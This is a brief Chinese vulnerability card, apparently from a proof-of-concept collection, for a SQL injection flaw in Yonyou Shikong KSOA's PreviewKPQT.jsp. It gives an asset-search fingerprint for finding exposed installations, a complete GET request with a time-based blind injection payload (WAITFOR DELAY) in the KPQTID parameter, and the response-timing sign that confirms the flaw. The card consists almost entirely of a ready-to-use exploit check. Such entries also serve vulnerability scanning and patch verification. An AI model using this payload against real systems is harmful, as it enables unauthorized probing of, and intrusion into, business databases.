# 用友时空KSOAPreviewKPQTSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s